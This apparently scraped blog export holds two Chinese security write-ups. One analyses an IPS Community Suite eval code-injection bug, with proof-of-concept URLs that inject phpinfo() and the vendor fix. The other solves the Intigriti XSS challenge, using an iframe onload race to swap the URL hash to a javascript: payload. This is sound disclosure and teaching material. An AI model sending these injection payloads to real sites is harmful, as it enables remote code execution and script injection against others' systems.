href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite13.jpg\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite13-300x225.jpg\" alt=\"ips-community-suite13\"></a></p>\n<h3 id=\"官方修复分析\"><a href=\"#官方修复分析\" class=\"headerlink\" title=\"官方修复分析\"></a>官方修复分析</h3><p>经过对比分析：</p>\n<p>发现Application.php这个文件中原来的 spl_autoload_register() 和更新后</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite14.jpg\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite14-300x225.jpg\" alt=\"ips-community-suite14\"></a></p>\n<p>通过对比可以看出，这次漏洞修复是使用 intval() 函数进一步对mb_substr()函数的返回值进行来整数验证。使得$databaseId的值必须为一个整数，这样防止了eval()执行传入的PHP代码。</p>\n<h3 id=\"漏洞修复\"><a href=\"#漏洞修复\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h3><ol>\n<li>PHP  5.4.x  升级至 5.4.25 以上， 5.5.x 升级至 5.5.9 以上</li>\n<li>IPS 升级至`4.12.3.1 以上</li>\n</ol>\n<p>如果您需要了解更多内容，可以<br>加入QQ群：570982169、486207500<br>直接询问：010-68438880-8669</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/SDP下一代的企业访问控制方法.jpg","excerpt":"<p>“IPS Community Suite “是一款在国外广泛使用的建站系统。近期被曝出在4.1.12.3版本及以下版本存在代码注入漏洞。这个漏洞通过控制content_class参数提交的请求来注入代码，以至于可以远程执行PHP代码。</p>","more":"<h3 id=\"影响版本\"><a href=\"#影响版本\" class=\"headerlink\" title=\"影响版本\"></a>影响版本</h3><p>IPS版本：&lt;=4.1.12.3</p>\n<h3 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h3><p>根据纰漏的漏洞细节，可以分析出这次漏洞的问题在于content_class这个参数。经过在源文件中搜索，发现这个参数在/applications/core/modules/front/system/content.php文件中被使用。、</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite1.jpg\"><img src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite1-300x90.jpg\" alt=\"ips-community-suite1\"></a></p>\n<p>在content.php文件中的find()函数里，IPSRequest::i()-&gt;content_class方法获取了GET提交的content_class参数，然后通过explode函数与implode函数进行字符串分割与拼接的处理，最后组合’IPS&#92;’字段赋值给$class。</p>\n<p>我们接着看下一行的if语句：$class的值将传递到class_exists()函数中去，我们在这里简单的的介绍下class_exists()函数：</p>\n<pre class=\"lang:default decode:true \">bool class_exists ( string $class_name [, bool $autoload = true ] );</pre>\n\n<p>class_exists()函数是用来检查类是否已定义。它有两个参数，我们平时用这个方法的时候大都只给了第一个参数，第二个参数的默认值是默认为true，当不去设置第二个参数时，会去默认调用__autoload方法去加载类。</p>\n<p>既然调用了__autoload方法，那不得不提到spl_autoload_register函数，这个方法会注册给定的函数作为 __autoload 的实现。 它实际上创建了 autoload 函数的队列，按定义时的顺序逐个执行。相比之下， <a href=\"http://php.net/manual/zh/function.autoload.php\">__autoload()</a> 只可以定义一次。</p>\n<p>接下来我们查看/applications/cms/Application.php 文件中的  spl_autoload_register() 函数，这个函数会被class_exists ()函数默认调用。</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite2.jpg\"><img src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite2-300x147.jpg\" alt=\"ips-community-suite2\"></a></p>\n<p>在spl_autoload_register() 函数中，我们发现有如下几行代码：</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite3.jpg\"><img src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite3-300x97.jpg\" alt=\"ips-community-suite3\"></a></p>\n<p>前文content.php文件中的$class变量将通过如下两个if判断，我们接下来看看if里的内容，发现了$class变量的值经过处理后在eval()函数中可以被执行，初步判定代码执行漏洞在这里被触发。</p>\n<p>因为两处触发点原理相同，我们就以第一处详细讲解：</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite4.jpg\"><img src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite4-300x60.jpg\" alt=\"ips-community-suite4\"></a></p>\n<p>如图所示，如果想顺利的进入if语句中，我们需要使$class变量前十四个字符串内容为’IPS\\cms\\Fields’;并且使第十五处字符为数字类型。</p>\n<p>绕过判定后，$class变量中第十四个字符以后所有的字符将赋值给$databaseId变量，而$databaseId变量中的PHP函数将会被eval执行，这样远程代码执行漏洞就会被触发。</p>\n<h3 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a><span style=\"font-size: large;\"><span style=\"color: #000000;\"><span style=\"font-family: 宋体;\">漏洞利用</span></span></span></h3><p>我们分析下这个漏洞如何来利用，已知$class变量的值是通过content.php文件中的如下语句传递的：</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite5.jpg\"><img src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite5-300x16.jpg\" alt=\"ips-community-suite5\"></a></p>\n<p>在这里content_class值是可以通过GET提交控制的，所以我们提交如下content_class参数content_class=cms\\Fields1{}phpinfo();/*</p>\n<p>经过处理后的$class值如下：</p>\n<p>&nbsp;</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite6.jpg\"><img src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite6-300x9.jpg\" alt=\"ips-community-suite6\"></a></p>\n<p>在/applications/cms/Application.php 文件中，$class的值顺利的绕过判定，进入if语句中去，此时的$databaseId变量值为</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite7.jpg\"><img src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite7-300x12.jpg\" alt=\"ips-community-suite7\"></a></p>\n<p>传入eval()中被执行。</p>\n<p>Poc：</p>\n<p>http://[host]/[ips]/index.php?app=core&amp;module=system&amp;controller=content&amp;do=find&amp;content_class=cms\\Fields1{}phpinfo();/*</p>\n<p>http://[host]/[ips]/index.php?app=core&amp;module=system&amp;controller=content&amp;do=find&amp;content_class= cms\\extensions\\core\\EditorLocations\\Records1{}phpinfo();/*</p>\n<p>执行结果：</p>\n<p>Poc执行后页面显示如下结果，和预期结果并不相同，</p>\n<p>[caption id=”attachment_5641” align=”aligncenter” width=”300”]<a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite8.jpg\"><img src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite8-300x137.jpg\" alt=\"IPS Community Suite8\"></a> IPS Community Suite8[/caption]</p>\n<p>我们接下来看一下抓包，发现返回的响应包中有三部分内容，第一部分为PHP报错信息，第二部分为phpinfo，而第三部分为原来/applications/core/modules/front/system/content.php中红框里代码执行后的结果：</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite9.jpg\"><img src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite9-300x27.jpg\" alt=\"ips-community-suite9\"></a></p>\n<p>上图红框里代码的作用是返回一个404页面，它正常执行后返回页面应如下图所示：</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite10.jpg\"><img src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite10-300x130.jpg\" alt=\"ips-community-suite10\"></a></p>\n<p>这三部分数据如下图所示：</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite11.jpg\"><img src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite11-279x300.jpg\" alt=\"ips-community-suite11\"></a></p>\n<p>由于这三个部分同时被服务器返回，前两部分为明文，而第三部分采用gzip压缩，导致浏览器显示内容编码错误，无法显示，但phpinfo()函数实际上被执行。</p>\n<p>为了使验证结果更明显，我们将/applications/core/modules/front/system/content.php中的404返回信息注释掉，如下图所示。</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite12.jpg\"><img src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite12-300x34.jpg\" alt=\"ips-community-suite12\"></a></p>\n<p>让第三部分404页面信息不返回，再次发送poc请求，结果如下图所示：</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite13.jpg\"><img src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite13-300x225.jpg\" alt=\"ips-community-suite13\"></a></p>\n<h3 id=\"官方修复分析\"><a href=\"#官方修复分析\" class=\"headerlink\" title=\"官方修复分析\"></a>官方修复分析</h3><p>经过对比分析：</p>\n<p>发现Application.php这个文件中原来的 spl_autoload_register() 和更新后</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite14.jpg\"><img src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite14-300x225.jpg\" alt=\"ips-community-suite14\"></a></p>\n<p>通过对比可以看出，这次漏洞修复是使用 intval() 函数进一步对mb_substr()函数的返回值进行来整数验证。使得$databaseId的值必须为一个整数，这样防止了eval()执行传入的PHP代码。</p>\n<h3 id=\"漏洞修复\"><a href=\"#漏洞修复\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h3><ol>\n<li>PHP  5.4.x  升级至 5.4.25 以上， 5.5.x 升级至 5.5.9 以上</li>\n<li>IPS 升级至`4.12.3.1 以上</li>\n</ol>\n<p>如果您需要了解更多内容，可以<br>加入QQ群：570982169、486207500<br>直接询问：010-68438880-8669</p>"},{"title":"Intigriti 10k followers XSS challenge题解","date":"2019-11-29T10:05:32.000Z","cover":"https://xzfile.aliyuncs.com/media/upload/picture/20191129175105-c2f5792e-128d-1.jpeg","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\n![7f3c6b234a0a4177e0235f746e8b284d.jpg](https://xzfile.aliyuncs.com/media/upload/picture/20191129175105-c2f5792e-128d-1.jpeg)\n\n前些日子Intigriti出了一道关于XSS的题目。目前比赛已经结束了，但是仍可以通过下面地址体验一下：\nhttps://challenge.intigriti.io\n\n题目很简单，就是从上图中的代码中找到xss漏洞，即可获胜\n\n分析\n----\n\n分析一下这段代码，为了方便测试，我把这个xss挑战代码放到了我本地*http://127.0.0.1/xssctf/index.html*地址\n\n首先在第二行处有个一个白名单，如下图红框处\n\n![7cfcb028a601cb6d3e6e4278adbcfbb8.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175133-d36fea8c-128d-1.png)\n\nWhitelist中定义了两个域名，'intigriti.com'与'intigriti.io'。这个白名单在下文代码中会用到\n\n接着通过location.hash.substr(1)取出字符串，并生成一个URL对象赋给url变量\n\n![033bf0112f5402dc2cb1ba95fed6475a.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175149-dce97ac4-128d-1.png)\n\nwindow.location.hash获取url中的锚点，简单来说就是url中#号以及#号后的部分\n\n例如访问：<http://127.0.0.1/xssctf/hash.html#hashtest>\n\nhash.html代码如下\n\n![e62dc97c301f191973dd53600d021165.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175207-e7e61176-128d-1.png)\n\n控制台输出如下\n\n![027e0dfd09d30936e54fe104cc314388.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175217-eda8f290-128d-1.png)\n\n值得注意的是：锚点中的内容仅供浏览器定位资源，并不会随着请求发送给目标服务器的\n\n注意下图，请求中并不包含锚点#hashtest内容\n\n![9024099cefc4390d08d1a7f77005c855.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175231-f5f7e21c-128d-1.png)\n\nlocation.hash.substr(1)实际上是用来获取井号之后的字符串，如上例获取的字符串则是hashtest\n\n接下来看原题\n\n![1003f667dd93047f53b91d87daa79ff5.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175238-fa078876-128d-1.png)\n\n程序在上图第四行红框中检查url中的hostname属性，是否在whitelist中\n\n因此我们如果想让程序进入此处if分支，需要构造#http://intigriti.io 类似的锚点值\n\n对应的url应该类似*http://127.0.0.1/xssctf/index.html#http://intigriti.io*\n\n在进入if分支后，程序接着将url.href通过encodeURIComponent编码，并document.write下来，如下图\n\n![f6ff03708da5bffd8b1ab6a1c29c29d8.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175255-04955304-128e-1.png)\n\n上图第5行处，由于这里url.href被编码，导致无法利用，所以这里不存在利用点\n\n接着看下面这块\n\n![520e7ffd4da03d8f550b4267ebf9b843.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175307-0b627130-128e-1.png)\n\n在上图红框处，存在一个setTimeout方法，setTimeout方法用于在指定的毫秒数后调用函数或计算表达式，是一个计时器\n\n当计时结束后，执行上图第7行内容，再次使用location.hash.substr(1)读取锚点值并跳转。\n\n如果此时的锚点值为恶意的xss payload例如javascript:alert(document.domain)，跳转时则会产生xss漏洞\n\n那么如何使得程序在第三行处获的锚点值为白名单中的'intigriti.com'或'intigriti.io'\n\n但在第7行时再次获取时变成恶意的xss payload呢？\n\n其实思路有两种，这就对应了这道题的两个不同解法\n\n1.  计算好时间，设计一个延时引信，等第一处location.hash.substr(1)一执行完就该锚点值\n\n![52f83caa986cb944b54d5185b7998979.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175316-10fcc7f8-128e-1.png)\n\n这种思路只需要关心程序从加载到执行完上图红框处需要多少时间\n\n2.  等这个脚本加载完毕，但setTimeout计时器时间未到，还未来得及执行第二处location.hash.substr(1)时修改锚点\n\n![9c14b7769a38d4a88bd3832020d57896.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175329-184569de-128e-1.png)\n\n这种思路只需要关心程序从执行上图setTimeout计时器使计时器开始运作时，到脚本完全执行结束需要多少时间。后续会介绍为什么需要考虑这个时间\n\n如果想实现以上两种中途修改锚点的操作，可以使用HTML内联框架元素(\\<iframe\\>)。它能够将另一个HTML页面嵌入到当前页面中，当把我们的目标页面嵌入我们构造的恶意页面中，我们就可以通过修改src属性来修改锚点的值\n\n解题思路\n--------\n\n### 解法一\n\n我将本次题目代码放到了http://127.0.0.1/xssctf/index.html ，下文里这个地址对应的就是这次题目在我本地的地址\n\n![643426f63105138270301a9d3d072ce6.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175336-1cdabdf0-128e-1.png)\n\n解法一是通过估算出从http://127.0.0.1/xssctf/index.html 被加载到第一处location.hash.substr(1)执行时的时间，通过估算这个时间(用X表示)，只要在这个时间之后，最理想的是执行后的一瞬间（因为再晚了第二处location.hash.substr(1)执行可就执行了），\n\n通过\ndocument.getElementById('xss').src把锚点改为#javascript:alert(document.domain)\n\n这样一来，当第二处location.hash.substr(1)执行时，获取的锚点值就会是#javascript:alert(document.domain) ，从而导致xss\n\n但是这个时间并不是很好计算，不能太早，也不能太晚\n\n![c4cded328593c2b4b3367d1d171ad0ff.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175349-24c3e690-128e-1.png)\n\n上图红框处的200，只是一个示例值，实际中不一定是这个数字，具体算起来麻烦且很不稳定\n\n### 解法二\n\n在看第二种解法之前，先介绍一下onload事件\n\nonload 事件会在页面或图像加载完成后立即发生\n\n但从字面意义上，有点难以理解具体onload的执行时机：\n\n例如通过iframe嵌入一个页面，被嵌入的页面中有一个setTimeout计时器，onload是等待计时器计时结束，并执行完计时器内部的代码后再执行呢？还是\n\n等被嵌入的页面逐行执行结束，不需要等待被嵌入页面的计时器计时结束，执行执行。\n\n为了测验onload加载的时机，我做了如下实验\n\nLoadiframe.html 使用iframe来嵌入其他页面，代码如下\n\n![d53edeeacb93c137b503063f18b213be.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175358-29bbdf2c-128e-1.png)\n\nIframe.html 被嵌入的页面，其中有一个setTimeout计时器，计时5秒之后在控制台里打印”step 4”\n\n![ca858cc9ccfb155c89833d768f012c10.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175407-2f25f6c8-128e-1.png)\n\n实际结果如下：\n\n![d09c0c5a62c0b6d0df37111ca6d18eab.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175416-34d47540-128e-1.png)\n\n当Iframe.html中脚本被逐行加载完后，Onload并未等待step 4 打印，直接触发\n\n通过这个例子可以看出，当被加载的页面中存在计时器时，并不影响onload的执行。\n\n只要被加载的页面中脚本被逐行加载完毕，onload就触发。\n\n因此对应的解法如下\n\n![a4eb0c2c89f3859e5de62e36a8434b33.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175423-38f32892-128e-1.png)\n\n程序执行到上图11行处时，index.html开始加载\n\n当index.html中脚本加载到下图第六行时，setTimeout计时器开始计时，在计时结束后执行location\n= location.hash.substr(1);\n\n![c8197ce9964bf55b6f99df9081fec35f.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175434-3f142708-128e-1.png)\n\n随后，脚本逐行执行。当index.html中脚本全部被执行完成后，恶意构造的页面中的onload被触发\n\n![334dea30f093e7b1f82e2a3a2038c6fc.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175441-43bc1a4a-128e-1.png)\n\n上图红框处即为onload触发时的代码，此处代码修改锚点值，将其变为恶意的payload\n\n这种解题思路的核心在于，从index.html中setTimeout计时器启动开始，执行index.html中后续的代码的时间，即加载完毕index.html从而可以触发onload事件的时间，与setTimeout计时器设置时间的比较\n\n![8c02c6d8f97340b5b6042c49c7a862f7.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175449-485ee190-128e-1.png)\n\n当setTimeout计时器设置时间比执行完上图红框处代码所需的时间长，则可顺利触发onload将锚点值更改，在计时结束后，计时器中代码获取的锚点值就变成了我们的payload\n\n但是如果setTimeout计时时间很短，index.html后续代码还未加载完，onload还未来的急触发，那利用就会失败\n\n举个例子：\n\nsetTimeout设置的是5000，也就是5秒。当setTimeout这行代码被执行，计时开始后，如果index.html中剩下几行可以在5秒内执行完，onload如期执行，5秒后的location.hash.substr(1)就变成了javascript:alert(document.domain)\n\n但是挑战中的setTimeout并没有设置计时时间，采用默认值\n\n默认计时时间是多久呢？我查看了下相关资料\n\n![41e629b599ba7c85515335076736935c.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175459-4df6eb0c-128e-1.png)\n\n![555df4d09d621fea8a08cb206353818d.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175507-532106ee-128e-1.png)\n\n可见如本次题目中这样，并不设置计时时间，留给我们的最少有4ms\n\n实际上，我测了一下在我的环境下，这个时间大概多久。使用如下代码\n\n![138620a7c0a940b191e0547c7a887dbe.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175514-576e88a2-128e-1.png)\n\n![b66663e54b9f3b29e2f4ea731f7baeb2.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175520-5ad797d6-128e-1.png)\n\n尽管测试代码不是很精准，但大概有59毫秒\n\n而执行index.php后续的仅剩的几行代码，几乎用不了这么多时间\n\n在0.059秒内，只要后续几行代码被执行，onload顺利触发，锚点被修改，我们就可以结题成功了\n\n关于其他解法的一些想法\n----------------------\n\n我发现，有些师傅使用如下思路\n\n![f5378d820f0f6ae1de8efd687545374e.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175534-633c1398-128e-1.png)\n\n想通过超长的锚点值来拖延目标程序运行时间\n\n我们再来看下原题\n\n![2dd50a171220bc768ad3927d91fc2233.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175548-6b94ddfe-128e-1.png)\n\n既然这种解法是通过onload来改变锚点值，那么影响结果的因素如上文分析，只有setTimeout的计时时间和setTimeout计时开始后，执行完后续代码以至onload触发的时间\n\n这里的超长锚点值，并不能影响这两者中的任何一个，因此我私自认为应该是没有用的，欢迎感兴趣的师傅一起讨论。","source":"_posts/Intigriti-XSS.md","raw":"---\ntitle: Intigriti 10k followers XSS challenge题解\ndate: 2019-11-29 18:05:32\ntags: ctf\ncategories: 技术\ncover: https://xzfile.aliyuncs.com/media/upload/picture/20191129175105-c2f5792e-128d-1.jpeg\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\n![7f3c6b234a0a4177e0235f746e8b284d.jpg](https://xzfile.aliyuncs.com/media/upload/picture/20191129175105-c2f5792e-128d-1.jpeg)\n\n前些日子Intigriti出了一道关于XSS的题目。目前比赛已经结束了，但是仍可以通过下面地址体验一下：\nhttps://challenge.intigriti.io\n\n题目很简单，就是从上图中的代码中找到xss漏洞，即可获胜\n\n分析\n----\n\n分析一下这段代码，为了方便测试，我把这个xss挑战代码放到了我本地*http://127.0.0.1/xssctf/index.html*地址\n\n首先在第二行处有个一个白名单，如下图红框处\n\n![7cfcb028a601cb6d3e6e4278adbcfbb8.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175133-d36fea8c-128d-1.png)\n\nWhitelist中定义了两个域名，'intigriti.com'与'intigriti.io'。这个白名单在下文代码中会用到\n\n接着通过location.hash.substr(1)取出字符串，并生成一个URL对象赋给url变量\n\n![033bf0112f5402dc2cb1ba95fed6475a.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175149-dce97ac4-128d-1.png)\n\nwindow.location.hash获取url中的锚点，简单来说就是url中#号以及#号后的部分\n\n例如访问：<http://127.0.0.1/xssctf/hash.html#hashtest>\n\nhash.html代码如下\n\n![e62dc97c301f191973dd53600d021165.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175207-e7e61176-128d-1.png)\n\n控制台输出如下\n\n![027e0dfd09d30936e54fe104cc314388.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175217-eda8f290-128d-1.png)\n\n值得注意的是：锚点中的内容仅供浏览器定位资源，并不会随着请求发送给目标服务器的\n\n注意下图，请求中并不包含锚点#hashtest内容\n\n![9024099cefc4390d08d1a7f77005c855.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175231-f5f7e21c-128d-1.png)\n\nlocation.hash.substr(1)实际上是用来获取井号之后的字符串，如上例获取的字符串则是hashtest\n\n接下来看原题\n\n![1003f667dd93047f53b91d87daa79ff5.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175238-fa078876-128d-1.png)\n\n程序在上图第四行红框中检查url中的hostname属性，是否在whitelist中\n\n因此我们如果想让程序进入此处if分支，需要构造#http://intigriti.io 类似的锚点值\n\n对应的url应该类似*http://127.0.0.1/xssctf/index.html#http://intigriti.io*\n\n在进入if分支后，程序接着将url.href通过encodeURIComponent编码，并document.write下来，如下图\n\n![f6ff03708da5bffd8b1ab6a1c29c29d8.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175255-04955304-128e-1.png)\n\n上图第5行处，由于这里url.href被编码，导致无法利用，所以这里不存在利用点\n\n接着看下面这块\n\n![520e7ffd4da03d8f550b4267ebf9b843.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175307-0b627130-128e-1.png)\n\n在上图红框处，存在一个setTimeout方法，setTimeout方法用于在指定的毫秒数后调用函数或计算表达式，是一个计时器\n\n当计时结束后，执行上图第7行内容，再次使用location.hash.substr(1)读取锚点值并跳转。\n\n如果此时的锚点值为恶意的xss payload例如javascript:alert(document.domain)，跳转时则会产生xss漏洞\n\n那么如何使得程序在第三行处获的锚点值为白名单中的'intigriti.com'或'intigriti.io'\n\n但在第7行时再次获取时变成恶意的xss payload呢？\n\n其实思路有两种，这就对应了这道题的两个不同解法\n\n1.  计算好时间，设计一个延时引信，等第一处location.hash.substr(1)一执行完就该锚点值\n\n![52f83caa986cb944b54d5185b7998979.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175316-10fcc7f8-128e-1.png)\n\n这种思路只需要关心程序从加载到执行完上图红框处需要多少时间\n\n2.  等这个脚本加载完毕，但setTimeout计时器时间未到，还未来得及执行第二处location.hash.substr(1)时修改锚点\n\n![9c14b7769a38d4a88bd3832020d57896.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175329-184569de-128e-1.png)\n\n这种思路只需要关心程序从执行上图setTimeout计时器使计时器开始运作时，到脚本完全执行结束需要多少时间。后续会介绍为什么需要考虑这个时间\n\n如果想实现以上两种中途修改锚点的操作，可以使用HTML内联框架元素(\\<iframe\\>)。它能够将另一个HTML页面嵌入到当前页面中，当把我们的目标页面嵌入我们构造的恶意页面中，我们就可以通过修改src属性来修改锚点的值\n\n解题思路\n--------\n\n### 解法一\n\n我将本次题目代码放到了http://127.0.0.1/xssctf/index.html ，下文里这个地址对应的就是这次题目在我本地的地址\n\n![643426f63105138270301a9d3d072ce6.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175336-1cdabdf0-128e-1.png)\n\n解法一是通过估算出从http://127.0.0.1/xssctf/index.html 被加载到第一处location.hash.substr(1)执行时的时间，通过估算这个时间(用X表示)，只要在这个时间之后，最理想的是执行后的一瞬间（因为再晚了第二处location.hash.substr(1)执行可就执行了），\n\n通过\ndocument.getElementById('xss').src把锚点改为#javascript:alert(document.domain)\n\n这样一来，当第二处location.hash.substr(1)执行时，获取的锚点值就会是#javascript:alert(document.domain) ，从而导致xss\n\n但是这个时间并不是很好计算，不能太早，也不能太晚\n\n![c4cded328593c2b4b3367d1d171ad0ff.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175349-24c3e690-128e-1.png)\n\n上图红框处的200，只是一个示例值，实际中不一定是这个数字，具体算起来麻烦且很不稳定\n\n### 解法二\n\n在看第二种解法之前，先介绍一下onload事件\n\nonload 事件会在页面或图像加载完成后立即发生\n\n但从字面意义上，有点难以理解具体onload的执行时机：\n\n例如通过iframe嵌入一个页面，被嵌入的页面中有一个setTimeout计时器，onload是等待计时器计时结束，并执行完计时器内部的代码后再执行呢？还是\n\n等被嵌入的页面逐行执行结束，不需要等待被嵌入页面的计时器计时结束，执行执行。\n\n为了测验onload加载的时机，我做了如下实验\n\nLoadiframe.html 使用iframe来嵌入其他页面，代码如下\n\n![d53edeeacb93c137b503063f18b213be.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175358-29bbdf2c-128e-1.png)\n\nIframe.html 被嵌入的页面，其中有一个setTimeout计时器，计时5秒之后在控制台里打印”step 4”\n\n![ca858cc9ccfb155c89833d768f012c10.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175407-2f25f6c8-128e-1.png)\n\n实际结果如下：\n\n![d09c0c5a62c0b6d0df37111ca6d18eab.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175416-34d47540-128e-1.png)\n\n当Iframe.html中脚本被逐行加载完后，Onload并未等待step 4 打印，直接触发\n\n通过这个例子可以看出，当被加载的页面中存在计时器时，并不影响onload的执行。\n\n只要被加载的页面中脚本被逐行加载完毕，onload就触发。\n\n因此对应的解法如下\n\n![a4eb0c2c89f3859e5de62e36a8434b33.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175423-38f32892-128e-1.png)\n\n程序执行到上图11行处时，index.html开始加载\n\n当index.html中脚本加载到下图第六行时，setTimeout计时器开始计时，在计时结束后执行location\n= location.hash.substr(1);\n\n![c8197ce9964bf55b6f99df9081fec35f.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175434-3f142708-128e-1.png)\n\n随后，脚本逐行执行。当index.html中脚本全部被执行完成后，恶意构造的页面中的onload被触发\n\n![334dea30f093e7b1f82e2a3a2038c6fc.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175441-43bc1a4a-128e-1.png)\n\n上图红框处即为onload触发时的代码，此处代码修改锚点值，将其变为恶意的payload\n\n这种解题思路的核心在于，从index.html中setTimeout计时器启动开始，执行index.html中后续的代码的时间，即加载完毕index.html从而可以触发onload事件的时间，与setTimeout计时器设置时间的比较\n\n![8c02c6d8f97340b5b6042c49c7a862f7.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175449-485ee190-128e-1.png)\n\n当setTimeout计时器设置时间比执行完上图红框处代码所需的时间长，则可顺利触发onload将锚点值更改，在计时结束后，计时器中代码获取的锚点值就变成了我们的payload\n\n但是如果setTimeout计时时间很短，index.html后续代码还未加载完，onload还未来的急触发，那利用就会失败\n\n举个例子：\n\nsetTimeout设置的是5000，也就是5秒。当setTimeout这行代码被执行，计时开始后，如果index.html中